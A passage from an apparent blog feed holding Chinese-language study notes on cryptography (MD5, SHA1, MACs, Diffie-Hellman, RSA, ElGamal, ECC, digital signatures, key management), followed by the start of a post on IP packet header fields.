&lt;p&gt;即a = a + A，b = b + B，c = c + C，d = d + D&lt;/p&gt;

&lt;p&gt;然后用下一分组数据继续运行以上算法。&lt;/p&gt;

&lt;h4 id=&quot;输出&quot;&gt;&lt;strong&gt;输出&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;最后的输出是a、b、c和d的级联。&lt;/p&gt;

&lt;p&gt;当你按照我上面所说的方法实现MD5算法以后，你可以用以下几个信息对你做出来的程序作一个简单的测试，看看程序有没有错误。&lt;/p&gt;

&lt;p&gt;MD5 (“”) = d41d8cd98f00b204e9800998ecf8427e&lt;/p&gt;

&lt;p&gt;MD5 (“a”) = 0cc175b9c0f1b6a831c399e269772661&lt;/p&gt;

&lt;p&gt;MD5 (“abc”) = 900150983cd24fb0d6963f7d28e17f72&lt;/p&gt;

&lt;p&gt;MD5 (“message digest”) = f96b697d7cb7938d525a2f31aaf161d0&lt;/p&gt;

&lt;p&gt;MD5 (“abcdefghijklmnopqrstuvwxyz”) = c3fcd3d76192e4007dfb496cca67e13b&lt;/p&gt;

&lt;p&gt;MD5 (“ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”) =&lt;/p&gt;

&lt;p&gt;f29939a25efabaef3b87e2cbfe641315&lt;/p&gt;

&lt;p&gt;MD5 (“8a683566bcc7801226b3d8b0cf35fd97”) =cf2cb5c89c5e5eeebef4a76becddfcfd&lt;/p&gt;

&lt;p&gt;MD5加密字符串实例&lt;/p&gt;

&lt;p&gt;现以字符串“jklmn”为例。&lt;/p&gt;

&lt;p&gt;该字符串在内存中表示为：6A 6B 6C 6D 6E（从左到右为低地址到高地址，后同），信息长度为40 bits， 即0x28。&lt;/p&gt;

&lt;p&gt;对其填充，填充至448位，即56字节。结果为：&lt;/p&gt;

&lt;p&gt;6A 6B 6C 6D 6E 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&lt;/p&gt;

&lt;p&gt;剩下64位，即8字节填充填充前信息位长，按小端字节序填充剩下的8字节，结果为。&lt;/p&gt;

&lt;p&gt;6A 6B 6C 6D 6E 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00&lt;/p&gt;

&lt;p&gt;（64字节，512 bits）&lt;/p&gt;

&lt;p&gt;初始化A、B、C、D四个变量。&lt;/p&gt;

&lt;p&gt;将这64字节填充后数据分成16个小组（程序中对应为16个数组），即：&lt;/p&gt;

&lt;p&gt;M0：6A 6B 6C 6D （这是内存中的顺序，按照小端字节序原则，对应数组M(0)的值为0x6D6C6B6A，下同）&lt;/p&gt;

&lt;p&gt;M1：6E 80 00 00&lt;/p&gt;

&lt;p&gt;M2：00 00 00 00&lt;/p&gt;

&lt;p&gt;…..&lt;/p&gt;

&lt;p&gt;M14：28 00 00 00&lt;/p&gt;

&lt;p&gt;M15：00 00 00 00&lt;/p&gt;

&lt;p&gt;经过“&lt;strong&gt;3. 分组数据处理&lt;/strong&gt;”后，a、b、c、d值分别为0xD8523F60、0x837E0144、0x517726CA、0x1BB6E5FE&lt;/p&gt;

&lt;p&gt;在内存中为a：60 3F 52 D8&lt;/p&gt;

&lt;p&gt;b：44 01 7E 83&lt;/p&gt;

&lt;p&gt;c：CA 26 77 51&lt;/p&gt;

&lt;p&gt;d：FE E5 B6 1B&lt;/p&gt;

&lt;p&gt;a、b、c、d按内存顺序输出即为最终结果：603F52D844017E83CA267751FEE5B61B。这就是字符串“jklmn”的MD5值。&lt;/p&gt;

&lt;h2 id=&quot;sha1&quot;&gt;SHA1&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;MD5算法得出的MD5值长度为16个字节（8&lt;em&gt;16=128位） 
SHA1算法得出的SHA1值长度为20个字节（8&lt;/em&gt;20=160位）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;算法-1&quot;&gt;算法&lt;/h3&gt;

&lt;h4 id=&quot;填充信息&quot;&gt;填充信息&lt;/h4&gt;

&lt;p&gt;和MD5算法类似，对信息的第一步也是填充信息直至满足条件。&lt;/p&gt;

&lt;p&gt;填充的过程如下：
1.先判断文件（消息）的大小（长度） mod 512 == 448 mod 512 ，就是大小（长度）对512求余等于448。（这里的512、448是“位”为单位，转成“字节”就是64、56，即mod 64 == 56 mod 64）&lt;/p&gt;

&lt;p&gt;2.如果大小（长度）满足 mod 512 == 448 mod 512，就在文件（消息）的末尾处添加64位（8字节）的值，值的内容是原消息的长度（以位为单位）&lt;/p&gt;

&lt;p&gt;3.如果大小（长度）不满足要求，就执行以下操作：
（1）填充1个1
（2）填充0，直到满足满足过程的第一步。&lt;/p&gt;

&lt;p&gt;注意：这里是以位为单位，假如是以字节为单位，第一个填充的是0x80（1000 0000），然后就填0x0
举例：消息内容为“gnubd”，就能得到以下内容&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-reStructuredText&quot;&gt;67 6E 62 75 64 80 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;还需要注意到的是最后原消息的长度是以大端存储的方式存到内存中的，这里与MD5的存储是有区别的。&lt;/p&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;h1 id=&quot;消息认证&quot;&gt;消息认证&lt;/h1&gt;

&lt;h2 id=&quot;作用目的&quot;&gt;作用&amp;amp;目的&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;验证信息来源的真实性&lt;/li&gt;
  &lt;li&gt;验证消息的完整性&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;认证函数实现&quot;&gt;认证函数实现&lt;/h2&gt;

&lt;h3 id=&quot;消息认证码mac&quot;&gt;消息认证码(MAC)&lt;/h3&gt;

&lt;p&gt;消息认证码的输入包括任意长度的消息和一个发送者与接收者之间的共享的密钥，它可以输出固定长度的数据，这个数据成为&lt;strong&gt;MAC值&lt;/strong&gt;。
 根据任意长度的雄性输出固定长度的数据，这一点和散列函数很类似。但是单向散列函数中计算散列值时不需要密钥，相对地，消息认证码中则需要使用发送者与接收者之间的共享密钥。
 要计算MAC必须持有共享密钥，没有共享密钥的人就无法计算MAC值，消息认证正是利用这一性质来完成认证的。此外，和单向散列函数的散列值一样，哪怕消息中发生1比特的变化，MAC值一会产生变化，消息认证码正是利用这一性质来确认完整性的。
 &lt;strong&gt;消息认证码是一种与密钥相关联的单向散列函数&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;基于des消息认证码&quot;&gt;基于DES消息认证码&lt;/h3&gt;

&lt;h3 id=&quot;基于hash消息认证码&quot;&gt;基于Hash消息认证码&lt;/h3&gt;

&lt;h4 id=&quot;hmac算法&quot;&gt;HMAC算法&lt;/h4&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;h1 id=&quot;公钥密码&quot;&gt;公钥密码&lt;/h1&gt;

&lt;h2 id=&quot;提出原因&quot;&gt;提出原因&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;秘钥分发问题&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;密钥更新共享的方式有以下几种类型：
A 选择密钥并手工传递给 B,在这样的一个情境中，A 和 B都是确实存在且可信的。而在互联网环境中，A 和 B 之间要建立信任关系，会很困难。&lt;/li&gt;
  &lt;li&gt;第三方 C 选择密钥分别手工传递给 A , B,在复杂的互联网环境中，C 如何将密钥安全的分发给 A和B，要保证其安全性也很困难。&lt;/li&gt;
  &lt;li&gt;用 A , B 原有共享密钥传送新密钥,这是一种相对安全的方式，但是互联网环境中需要A和B要有一份复杂的密钥交换协议，才可以实现新密钥的共享。&lt;/li&gt;
  &lt;li&gt;与 A , B 分别有共享密钥的第三方 C 传送新密钥给 A 和（或） B,此过程也需要一份复杂的密钥交换协议来确保C能够将密钥安全的分发给 A 和 B。&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;秘钥管理问题&lt;/p&gt;

    &lt;p&gt;除了密钥的更新问题困难以外，还有对密钥管理的问题仍然存在。在对称密码算法中必须要对密钥进行管理，但是对密钥的管理又十分的困难。&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;例如：&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;  N 个用户集需要 N(N-1)/2 个共享密钥，当用户量增大时，密钥空间急剧增大。&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;n = 100 时，  C(100,2) = 4,995&lt;/li&gt;
      &lt;li&gt;n = 5000时， C(5000,2) = 12,497,500&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;数字签名问题&lt;/p&gt;

    &lt;p&gt;传统加密算法无法实现抗抵赖的需求。在对称加密算法中，共享的密钥是通信双方都知道的 ，所以无法使用共享的密钥来对对方的身份进行确认。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;单向陷门函数&quot;&gt;单向陷门函数&lt;/h2&gt;

&lt;p&gt;单向陷门函数可以被定义为如下函数f：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;给出f的定义域中的任意元素x,  f(x)的计算是容易的；&lt;/li&gt;
  &lt;li&gt;给出y=f (x)中的y要计算x时，若知道设计函数f时结合进去的某种信息（该信息称为陷门），则容易计算；若不知道该信息，则难以计算。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前人们主要是基于如下的数学上的困难问题来设计单向函数和公钥密码体制：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;大整数分解问题(如公钥密码体制RSA)；&lt;/li&gt;
  &lt;li&gt;有限域上的离散对数问题(如公钥密码体制ElGamal):&lt;/li&gt;
  &lt;li&gt;椭圆曲线上的离散对数问题(如公钥密码体制ECC)。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;为什么要用公钥密码&quot;&gt;为什么要用公钥密码&lt;/h2&gt;

&lt;p&gt;（1） 机密性的实现
发送方用接收方的公钥加密消息，接收方用自己的私钥来解密。
（2） 数字签名
发送方用自己的私钥来签名消息，接收方通过发送方对应的公钥来鉴别消息，并且发送方不能对自己的签名进行否认。
（3） 密钥分发和协商
发送方和接收方基于公钥密码系统容易实现在公开信道上的大规模的密钥分发和协商。&lt;/p&gt;

&lt;h2 id=&quot;dh秘钥交换&quot;&gt;DH秘钥交换&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;DH，全称为“Diffie-Hellman”，这是一种确保共享KEY安全穿越不安全网络的方法，换句话说就是密钥一致协议，由公开密钥密码体制的奠基人Diffie和Hellman所提出的一种思想&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;简单的说就是允许两名用户在公开媒体上交换信息以生成“一致”的、可以共享的密钥。也就是由甲方产出一对密钥（公钥、私钥），乙方依照甲方公钥产生乙方密钥对（公钥、私钥）。它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道建立起一个密钥。这个密钥可以在后续的通讯中作为对称密钥来加密通讯内容。&lt;/p&gt;

&lt;h3 id=&quot;dh密钥交换模型分析&quot;&gt;DH密钥交换模型分析&lt;/h3&gt;

&lt;p&gt;我们还是以甲乙双方发送数据为模型进行分析&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;甲方（消息发送方，下同）构建密钥对（公钥+私钥），甲方公布公钥给乙方（消息接收方，下同）&lt;/li&gt;
  &lt;li&gt;乙方以甲方发送过来的公钥作为参数构造密钥对（公钥+私钥），将构造出来的公钥公布给甲方&lt;/li&gt;
  &lt;li&gt;甲方用“甲方的私钥+乙方的公钥”构造本地密钥&lt;/li&gt;
  &lt;li&gt;乙方用“乙方的私钥+甲方的公钥”构造本地的密钥&lt;/li&gt;
  &lt;li&gt;这个时候，&lt;strong&gt;甲乙两方本地新构造出来的密钥应该一样&lt;/strong&gt;，甲乙双方可以通过本地密钥进行数据的加密和解密&lt;/li&gt;
  &lt;li&gt;然后就可以&lt;strong&gt;使用AES这类对称加密算法进行数据的安全传送&lt;/strong&gt;了。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;dh数学原理&quot;&gt;DH数学原理&lt;/h3&gt;

&lt;p&gt;有两个全局公开的参数，一个素数p和一个整数g，g是p的一个原根。&lt;/p&gt;

&lt;p&gt;服务端的私钥和公钥分别是a和A，客户端的私钥和公钥分别是b和B；&lt;/p&gt;

&lt;p&gt;服务端根据a、p、g，可以计算出公钥A；&lt;/p&gt;

&lt;p&gt;服务端将g, p, A明文传送给客户端，客户端可以计算自己的公钥B，以及共享密钥K；&lt;/p&gt;

&lt;p&gt;客户端将B明文发送给服务端，服务端也可以计算出共享密钥K。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/DH.png&quot; alt=&quot;DH&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;安全问题-中间人攻击&quot;&gt;安全问题-中间人攻击&lt;/h3&gt;

&lt;p&gt;在最初的描述中，迪菲-赫尔曼密钥交换本身并没有提供通讯双方的身份验证服务，因此它很容易受到中间人攻击。 
一个中间人“丙”在信道的中央进行两次迪菲－赫尔曼密钥交换，一次和甲，另一次和乙，就能够成功的向甲假装自己是乙，反之亦然。
而攻击者可以解密（读取和存储）任何一个人的信息并重新加密信息，然后传递给另一个人。因此通常都需要一个能够验证通讯双方身份的机制来防止这类攻击。
&lt;strong&gt;有很多种安全身份验证解决方案使用到了迪菲－赫尔曼密钥交换。例如当甲和乙共有一个公钥基础设施时，可以将他们的返回密钥进行签名。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;rsa&quot;&gt;RSA&lt;/h2&gt;

&lt;p&gt;RSA公钥算法是由 MIT (麻省理工学院, Massachusetts Institute of Technology) 的Rivest, Shamir和Adleman在1978年提出来的。RSA方案是被最广泛接受并实现的通用公开密钥密码算法，目前已成为公钥密码的国际标准。该算法的数学基础是初等数论中的欧拉定理，其安全性建立在大整数因子分解的困难性之上。&lt;/p&gt;

&lt;h3 id=&quot;密钥的生成&quot;&gt;密钥的生成&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;选择两个大素数 &lt;code&gt;p&lt;/code&gt;，&lt;code&gt;q&lt;/code&gt;，（p，q为互异素数，需要保密）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;计算&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;n= p *q\\
\Phi(n)=(p-1)*(q-1)&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;选择整数 &lt;code&gt;e&lt;/code&gt; 使&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
gcd(\phi(n),e)=1\\
1 &lt; e &lt;\phi(n) %]]&gt;&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;计算d&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;d*e=1mod\phi(n)&lt;/script&gt;

&lt;p&gt;得到：公钥 为&lt;code&gt;{e,n}&lt;/code&gt;； 私钥为&lt;code&gt;{d}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;加密-1&quot;&gt;加密&lt;/h3&gt;

&lt;p&gt;明文:M&lt;/p&gt;

&lt;p&gt;密文:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
接受(e,n)\\
M分组,长度问L(L&lt;log_{2}n)M=m_{1}m_{2}...\\
加密算法:c_{i}=m_{i}^{e}(modn) %]]&gt;&lt;/script&gt;

&lt;h3 id=&quot;解密-1&quot;&gt;解密&lt;/h3&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;m_{i}=c^{d}_{i}mod(n)&lt;/script&gt;

&lt;h3 id=&quot;安全性&quot;&gt;安全性&lt;/h3&gt;

&lt;h4 id=&quot;攻击方式&quot;&gt;攻击方式&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;因子分解&lt;/p&gt;

    &lt;p&gt;​	分解n&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;针对参数攻击&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;共模攻击&lt;/li&gt;
      &lt;li&gt;低指数攻击&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;elgamal&quot;&gt;ElGamal&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;该算法安全性依赖于计算有限域上离散对数难题：求解离散对数(目前)是困难的,其逆运算指数运算简单。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;秘钥生成&quot;&gt;秘钥生成&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;随机选取一个满足安全要求的大素数p,生成有限域z_{p}的一个生成元g&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;选取一个随机数x(1&amp;lt;x&amp;lt;p-1),计算:&lt;/p&gt;

    &lt;script type=&quot;math/tex; mode=display&quot;&gt;y=g^{x}(modp)&lt;/script&gt;

    &lt;p&gt;&lt;code&gt;公钥为(y,g,p),私钥为x&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加密-2&quot;&gt;加密&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;接受(y,g,p)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;消息m分组为长度为L(L&amp;lt;log_{2}p)的消息分组m=m_{1}m_{2}….&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对第i块消息(1&amp;lt;=i&amp;lt;=t)随机选择整数r_{i},1&amp;lt;r_{i}&amp;lt;p-1&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;计算:&lt;/p&gt;

    &lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
c_{i}=g^{r_{i}}(modp)\\
c^{'}_{i}=m_{i}y^{r_{i}}(modp)(1&lt;=i&lt;t) %]]&gt;&lt;/script&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将密文C=(c_{i},c^{‘}_{1})…..发给接受方&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;解密-2&quot;&gt;解密&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;接受密文&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;计算:&lt;/p&gt;

    &lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
m_{i}=(c^{'}_{i}/c^{x}_{i})(mod p)\\
(1&lt;=i&lt;=t) %]]&gt;&lt;/script&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;得到明文:&lt;/p&gt;

    &lt;p&gt;m=m1m2…&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;安全性-1&quot;&gt;安全性&lt;/h3&gt;

&lt;h4 id=&quot;小步大步算法&quot;&gt;小步大步算法&lt;/h4&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;h4 id=&quot;指数积分法&quot;&gt;指数积分法&lt;/h4&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;h2 id=&quot;椭圆曲线公钥加密&quot;&gt;椭圆曲线公钥加密&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;椭圆曲线加密算法，即：Elliptic Curve Cryptography，简称ECC，是基于椭圆曲线数学理论实现的一种非对称加密算法。相比RSA，ECC优势是可以使用更短的密钥，来实现与RSA相当或更高的安全。据研究，160位ECC加密安全性相当于1024位RSA加密，210位ECC加密安全性相当于2048位RSA加密&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一般情况下，椭圆曲线可用下列方程式来表示，其中a,b,c,d为系数。&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;E:y^2=ax^3+ bx^2+c^x+d&lt;/script&gt;

&lt;h3 id=&quot;椭圆曲线的运算规则&quot;&gt;椭圆曲线的运算规则&lt;/h3&gt;

&lt;h3 id=&quot;加法&quot;&gt;加法&lt;/h3&gt;

&lt;p&gt;过曲线上的两点A、B画一条直线，找到直线与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A+B，即为加法。如下图所示：A + B = C&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/加法.png&quot; alt=&quot;加法&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;二倍运算&quot;&gt;二倍运算&lt;/h3&gt;

&lt;p&gt;上述方法无法解释A + A，即两点重合的情况。因此在这种情况下，将椭圆曲线在A点的切线，与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A + A，即2A，即为二倍运算。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2倍.png&quot; alt=&quot;2倍&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;正负取反&quot;&gt;正负取反&lt;/h3&gt;

&lt;p&gt;将A关于x轴对称位置的点定义为-A，即椭圆曲线的正负取反运算。&lt;/p&gt;

&lt;h3 id=&quot;无穷远点&quot;&gt;无穷远点&lt;/h3&gt;

&lt;p&gt;如果将A与-A相加，过A与-A的直线平行于y轴，可以认为直线与椭圆曲线相交于无穷远点。&lt;/p&gt;

&lt;p&gt;综上，定义了A+B、2A运算，因此给定椭圆曲线的某一点G，可以求出2G、3G（即G + 2G）、4G……。即：当给定G点时，已知x，求xG点并不困难。反之，已知xG点，求x则非常困难。此即为椭圆曲线加密算法背后的数学原理。&lt;/p&gt;

&lt;p&gt;….&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;具体算法参考书籍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;对称密码体制vs公钥密码体制&quot;&gt;对称密码体制Vs公钥密码体制&lt;/h2&gt;

&lt;p&gt;对称密码体制的缺陷：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 密钥分配问题：通信双方要进行加密通信，需要通过秘密的安全信道协商加密密钥，而这种安全信道可能很难实现
 密钥管理问题：在有多个用户的网络中，任何两个用户之间都需要有共享的密钥，当网络中的用户n很大时，需要管理的密钥数目非常大，为n(n-1)/2
没有签名功能：当主体A收到主体B的电子文挡(电子数据)时，无法向第三方证明此电子文档确实来源于B。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;公钥密码体制重点考察三个领域的问题：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;密钥交换：通信双方交换会话密钥，以加密通信双方后续连接所传输的信息。每次逻辑连接使用一把新的会话密钥，用完就丢弃。
通信保密：将公钥作为加密密钥，私钥作为解密密钥，通信双方不需要交换密钥就可以实现保密通信。
数字签名：将私钥作为加密密钥，公钥作为解密密钥，可实现由一个用户对数据加密而使多个用户解读。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在公钥密码体制以前的整个密码学史中，所有的密码算法，包括古典密码和现代密码，都是基于替换和置换这两个基本工具。而公钥密码体制则为密码学的发展提供了新的理论和技术基础， 一方面公钥密码算法的基本工具不再是代换和置换，而是数学函数； 另一方面公钥密码算法是以非对称的形式使用两个密钥，两个密钥的使用对保密性、密钥分配、签名、认证等都有着深刻的意义。&lt;/p&gt;

&lt;p&gt;公钥算法加密解密速度慢。误区：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;公开密钥密码算法更安全
公开密钥密码使对称密钥密码过时了 # 数字签名
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;数字签名解决的问题&quot;&gt;数字签名解决的问题&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;A发送消息给B：A（不可抵赖）——————&amp;gt;B（不可伪造）（不可重用）
(1)不可抵赖     (假如：A可以否认发过该消息，B无法证明A确实发了该消息)
(2)不可伪造 	    (假如：B伪造一个不同的消息，但声称是从A收到的）
(3)不可重用		(假如：签名没有和消息绑定)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;安全模型性质&quot;&gt;安全模型,性质&lt;/h2&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;h2 id=&quot;rsa签名算法以及存在的安全问题&quot;&gt;RSA签名算法以及存在的安全问题&lt;/h2&gt;

&lt;p&gt;如果不使用HASH函数&lt;/p&gt;

&lt;p&gt;1.（存在性伪造）使用“已知消息攻击”
利用RSA的乘法特性，可以进行如下攻击
假设 y1=sigk(m1)和y2=sigk(m2) 是签名者曾经签署的有效签名，
那么 verk (m1m2 mod n, y1y2 mod n) = true&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;（选择性伪造）利用“选择消息攻击”
假设攻击者要对消息 m 伪造一个签名，m=m1m2mod n。
假设攻击者能请求签名者为 m1 和 m2 签名(结果分别为y1和y2)，
那么， y1 y2 mod n 就是消息 m 的有效签名&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;对抗攻击的方法：使用HASH函数
私钥签名，公钥验证&lt;/p&gt;

&lt;h2 id=&quot;elgamal签名算法以及存在的安全问题&quot;&gt;ElGamal签名算法以及存在的安全问题&lt;/h2&gt;

&lt;h2 id=&quot;特殊的签名算法以及适应的应用场景&quot;&gt;特殊的签名算法以及适应的应用场景&lt;/h2&gt;

&lt;h1 id=&quot;密码协议&quot;&gt;密码协议&lt;/h1&gt;

&lt;h1 id=&quot;秘钥管理&quot;&gt;秘钥管理&lt;/h1&gt;

&lt;h2 id=&quot;原则&quot;&gt;原则&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;区分秘钥管理的策略和机制&lt;/li&gt;
  &lt;li&gt;完全安全原则&lt;/li&gt;
  &lt;li&gt;最小权利原则&lt;/li&gt;
  &lt;li&gt;责任分离原则&lt;/li&gt;
  &lt;li&gt;秘钥分级原则&lt;/li&gt;
  &lt;li&gt;秘钥更换原则&lt;/li&gt;
  &lt;li&gt;秘钥有足够长度&lt;/li&gt;
  &lt;li&gt;密码体制不同,秘钥管理也不同&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;几类秘钥作用&quot;&gt;几类秘钥作用&lt;/h2&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc] 基础概念</summary></entry><entry><title type="html">IP报文</title><link href="http://localhost:4000/_posts/2020-07-18-IP%E6%8A%A5%E6%96%87/" rel="alternate" type="text/html" title="IP报文" /><published>2020-07-18T00:00:00-04:00</published><updated>2020-07-18T00:00:00-04:00</updated><id>http://localhost:4000/_posts/IP%E6%8A%A5%E6%96%87</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-18-IP%E6%8A%A5%E6%96%87/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;IP报文是在网络层传输的数据单元，也叫IP数据报&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/IP报文.png&quot; alt=&quot;IP报文&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;版本：IP协议的版本，目前的IP协议版本号为4，下一代IP协议版本号为6。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;首部长度：IP报头的长度。固定部分的长度（20字节）和可变部分的长度之和。共占4位。最大为1111，即10进制的15，代表IP报头的最大长度可以为15个32bits（4字节），也就是最长可为15*4=60字节，除去固定部分的长度20字节，可变部分的长度最大为40字节。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;服务类型：Type Of Service。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;总长度：IP报文的总长度。报头的长度和数据部分的长度之和。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;标识：唯一的标识主机发送的每一分数据报。通常每发送一个报文，它的值加一。当IP报文长度超过传输网络的MTU（最大传输单元）时必须分片，这个标识字段的值被复制到所有数据分片的标识字段中，使得这些分片在达到最终目的地时可以依照标识字段的内容重新组成原先的数据。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;标志：共3位。R、DF、MF三位。目前只有后两位有效，DF位：为1表示不分片，为0表示分片。MF：为1表示“更多的片”，为0表示这是最后一片。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;片位移：本分片在原先数据报文中相对首位的偏移位。（需要再乘以8）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;生存时间：IP报文所允许通过的路由器的最大数量。每经过一个路由器，TTL减1，当为0时，路由器将该数据报丢弃。TTL 字段是由发送端初始设置一个 8 bit字段.推荐的初始值由分配数字 RFC 指定，当前值为 64。发送 ICMP 回显应答时经常把 TTL 设为最大值 255。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;协议：指出IP报文携带的数据使用的是那种协议，以便目的主机的IP层能知道要将数据报上交到哪个进程（不同的协议有专门不同的进程处理）。和端口号类似，此处采用协议号，TCP的协议号为6，UDP的协议号为17。ICMP的协议号为1，IGMP的协议号为2.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
